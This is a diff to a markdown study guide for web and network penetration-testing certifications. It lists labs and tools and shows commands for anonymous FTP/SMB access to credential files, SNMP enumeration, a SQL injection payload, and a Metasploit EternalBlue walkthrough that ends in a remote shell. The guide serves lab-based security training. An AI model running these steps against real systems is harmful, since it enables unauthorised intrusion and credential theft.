@@ -1,4 +1,4 @@
-### Resources:
+# Resources:
 
 https://www.udemy.com/course/learn-bug-bounty-hunting-web-security-testing-from-scratch (1 month)
 
@@ -12,33 +12,33 @@ CWES (1 month)
 
 Report tools (for CWES exam): https://github.com/Syslifters/HackTheBox-Reporting
 
-### Labs
+# Labs
 
 https://orange-cyberdefense.github.io/GOAD/labs/MINILAB/
 
 https://hackthebox.com
 
-htpps://tryhackme.com
+https://tryhackme.com
 
-### Cheat sheets:
+# Cheat sheets:
 
 https://github.com/Touexe/CBBH-CWES
 
 https://github.com/Burdy98/Pentest-Methodology/blob/main/CWES-Methodology.md
 
-### Tools/Others:
+# Tools/Others:
 
 http://portswigger.net/: collection of all vulnerable websites, we can choose and practice on these websites safely & legally
 
 ## Reconnaissance & Enumeration tools
 
-# Infrastructure & Network
+### Infrastructure & Network
 
 nmap
 
 https://github.com/bee-san/RustScan
 
-# Web Surface
+### Web Surface
 
 https://github.com/OJ/gobuster
 
@@ -46,11 +46,11 @@ https://github.com/epi052/feroxbuster
 
 https://github.com/maurosoria/dirsearch
 
-# list of common vulnerability
+### list of common vulnerability
 
 https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt
 
-# Vulnerability Scanning
+### Vulnerability Scanning
 
 https://github.com/projectdiscovery/nuclei
 
@@ -58,7 +58,7 @@ https://github.com/aquasecurity/trivy
 
 https://github.com/aquasecurity/kube-hunter
 
-# Exploitation & Deep Testing
+### Exploitation & Deep Testing
 
 https://portswigger.net/burp
 
@@ -68,7 +68,7 @@ https://github.com/ffuf/ffuf
 
 https://github.com/xmendez/wfuzz
 
-# Common flow:
+### Common flow:
 
 nmap/rustscan -> find out port 80/433 -> use feroxbuster -> find out path /api/v1/user -> use Burp suite -> analyze api request -> use ffuf -> brute-force ID parameter -> find out IDOR (Insecure Direct Object Reference) or use Nuclei -> scan API CVE
 
@@ -76,7 +76,7 @@ nmap/rustscan -> find out port 80/433 -> use feroxbuster -> find out path /api/v
 
 ## Attach Network Service
 
-# Banner Grabbing
+### Banner Grabbing
 
 Auto scan 1,000 ports:
 nmap -sV --script=banner [IP]
@@ -84,7 +84,7 @@ nmap -sV --script=banner [IP]
 we can also attempt this manually using netcat (nc cmd):
 nc -nv [ip] [port]
 
-# FTP
+### FTP
 ftp -p [IP] : connect FTP (input 'anonymous' if prompt ask to check)
 
 collect priviledges: 
@@ -93,13 +93,13 @@ get login.txt
 or
 get password.txt
 
-# SMB
+### SMB
 
 nmap --script smb-os-discovery.nse -p445 [IP]
 
 nmap -A -p445 [IP]
 
-# Shares
+### Shares
 
 smbclient -N -L \\\\[IP] : retrieve a list of available shares on the IP (-L), while -N suppresses the password prompt
 
@@ -118,7 +118,7 @@ cat flag.txt
 try to connect with specific username  (ex:bob in bob:Weblcome1)
 smbclient -U [username] //[IP]/users
 
-# SNMP (port 161 UDP)
+### SNMP (port 161 UDP)
 In SNMP, we have 2 strings public and private. Private string allows to read/write system info of device
 
 snmpwalk -v 2c -c public [IP] [private string - OID - Object Identifier. ex: 1.3.6.1.2.1.1.5.0]
@@ -156,7 +156,64 @@ searchsploit openssh 7.2 : search for a specific application by its name
 
 MEtrasploit Primer : Metasploit Framework (MSF): pentest tool
 
-# Attack Active Directory & Internal network
+### Public Exploits
+
+After finding out a tech stacks and services, version running on server, the next step is that check in search engine (google,bing...) whether having an vulnerability declared or not with keyword "[app/service name] [version] exploit"
+
+Or we can use an special tools name Searchsploit: 
+```
+$ sudo apt install -y exploitdb
+```
+
+then search by using cmd: 
+```
+$ searchsploit [app/service name] [version]
+```
+
+Or checkout on online DB: https://www.exploit-db.com/ and https://www.rapid7.com/db/
+
+Metasploit Framework (MSF)
+
+MSF is a powerful framework, which allows to exploit testing, integrate robust features and tools such as run script to collect info, check target server has vulnerability or not,.... It can run on Windows, Linux, MacOS
+
+```
+// startup 
+$ msfconsole
+
+// search exploit
+$ search exploit eternalblue
+
+// choose module 0
+$ use 0
+
+// choose module
+$ use exploit/windows/smb/ms17_010_psexec (or specific path)
+
+// show options
+$ show options
+
+// set target IP
+set RHOSTS [target IP]
+
+// set target port
+set RPORT 30570
+
+// set attack IP
+set LHOST tun0
+
+// check exploit
+$ check
+
+// take control
+$ exploit
+// or
+$ run
+
+// enter cli
+$ shell
+```
+
+### Attack Active Directory & Internal network
 
 NetExec / CrackMapExec: password spraying, list share SMB, check admin privilenge, execute remotely cmd
 
@@ -168,11 +225,11 @@ Responder: Poisoning LLMNR/NBT-NS, collect NTLMv2
 
 Rubeus & Minikatz: 
 
-# Privillege Escalation
+### Privillege Escalation
 
 WinPEAS / LinPEAS
 
-# Pivoting & Tunneling
+### Pivoting & Tunneling
 
 Ligolo-ng
 
@@ -191,7 +248,7 @@ Chisel
 
 UNION SELECT NULL--
 
-# tools:
+### tools:
 
 https://github.com/sqlmapproject/sqlmap
 
@@ -244,7 +301,7 @@ Horizontal Privilege Escalation
 
 User1 -> User2
 
-# Authentication
+### Authentication
 
 Brute Force
 
@@ -305,7 +362,7 @@ SysReport
 
 Obsidian / Notion
 
-# tmux: 
+### tmux: 
 Ctrl + B is a prefix command default of tmux
 
 Ctrl + B, then C : open a new windows
@@ -320,11 +377,21 @@ use up down arrow to switch horizontal windows, and let right arrow to switch ve
 
 more info: https://tmuxcheatsheet.com/
 
-# vim
+### vim
 
 https://vimsheet.com/
 
-### useful commands
+### OS
+
+Kali linux: Industry Standard
+
+Parrot OS (Security Edition): Recommend to use
+
+### Metasploit Framework (MSF)
+
+https://www.metasploit.com/
+
+# useful commands
 
 netcat [IP] [port][ get banner string of server
 
@@ -342,6 +409,8 @@ nmap --script [script name] -p[port] [host/ip] : run with specific script
 nmap -sCV [IP] : combine 2 above cmds
 
 nmap -sCV -p- [IP] : scan all 65,535 TCP ports
+
+nmap -sV -p [port] [IP] -Pn
 
 
 
